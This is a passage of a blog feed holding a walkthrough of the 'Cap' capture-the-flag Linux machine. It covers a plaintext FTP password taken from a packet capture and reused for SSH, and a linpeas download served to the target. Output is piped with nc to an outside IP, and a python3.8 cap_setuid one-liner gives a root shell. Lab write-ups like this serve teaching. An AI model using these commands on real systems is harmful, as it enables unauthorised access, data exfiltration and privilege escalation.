+<p>When you download and open the file from the dashboard page with <strong>id = 0</strong>, inspect the packets from the Wireshark capture. You will soon find that the sensitive data is in the FTP protocol. Where a request is sent with a password in plain text.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="https://danae-pan.github.io/Blog/blog/Cap#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
+<p>Try to ssh to the target ip address with the user name and the password for you obtained in the previous step. You will see that this will succesfully work.</p>
+<p><code>ssh nathan@&lt;target_ip&gt;</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-c-2-b9391c7ad666eef49e23031fbb6b15e0.png" width="1366" height="896" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="https://danae-pan.github.io/Blog/blog/Cap#task-7" class="hash-link" aria-label="Direct link to Task 7" title="Direct link to Task 7">​</a></h3>
+<p>Get the user.txt flag from the ftp server.</p>
+<p><code>wget ftp://user:password@ftp.mydomain.com/path/file.ext</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-c-1-f7f9b0dbf4cb43e20733f5f3c49c08dc.png" width="1592" height="774" class="img_ev3q"></p>
+<p>In your host run <code>cat user.txt</code> and obtain the user flag.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-8">Task 8<a href="https://danae-pan.github.io/Blog/blog/Cap#task-8" class="hash-link" aria-label="Direct link to Task 8" title="Direct link to Task 8">​</a></h3>
+<p>What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?</p>
+<p>First clone the reposiroty for using the Linux escalating privelages script. Then make the script executable.</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">chmod +x linpeas.sh</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>Start a Python HTTP server to transfer the script to the target machine.</p>
+<p><code>python3 -m http.server 8080</code></p>
+<p>On the target machine, log in with the username <strong>nathan</strong> and his credentials, get the file from your host system.</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">cd /tmp</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">wget http://&lt;host_ip_address&gt;:8080/linpeas.sh -O linpeas.sh</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">chmod +x linpeas.sh</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">./linpeas.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>and run it saving the output to a text file.
+<code>/tmp/linpeas.sh | tee /tmp/linpeas-output.txt</code></p>
+<p>You can tranfer this text file to your local machine for further analysis by opening a port to "listen" to a connection and save the incoming data to a new file locally.</p>
+<p><code>nc -lvnp 4444 &gt; linpeas_output.txt</code></p>
+<p>From the target machine you can send the file</p>
+<p><code>cat linpeas_output.txt | nc 10.10.14.190 4444</code></p>
+<p>Inspecting the file, under <strong>Files with capabilities</strong> the interesting file is <strong>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</strong> which indicates potential privilege escalation allowing changing the user ID to another user (including root)</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-c-3-e2f193c6826ee8912cec1ffd7e68d37c.png" width="1360" height="408" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-9">Task 9<a href="https://danae-pan.github.io/Blog/blog/Cap#task-9" class="hash-link" aria-label="Direct link to Task 9" title="Direct link to Task 9">​</a></h3>
+<p>You can escalate priveleges and switch to root by attempting</p>
+<p><code>/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></p>
+<p>then find the flag</p>
+<p><code>find / -name "root.txt" 2&gt;/dev/null</code></p>
+<p>and read the flag by
+<code>cat /root/root.tx/</code></p>]]></content>
+        <category label="easy" term="easy"/>
+        <category label="linux" term="linux"/>
     </entry>
 </feed>
